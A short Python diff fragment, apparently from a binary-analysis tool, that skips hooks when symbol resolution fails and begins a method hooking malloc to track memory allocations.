+            # Symbol resolution failed - continue without hooks
+            pass
 
     def _malloc_hook(self, state):
         """Hook for malloc to track allocations."""
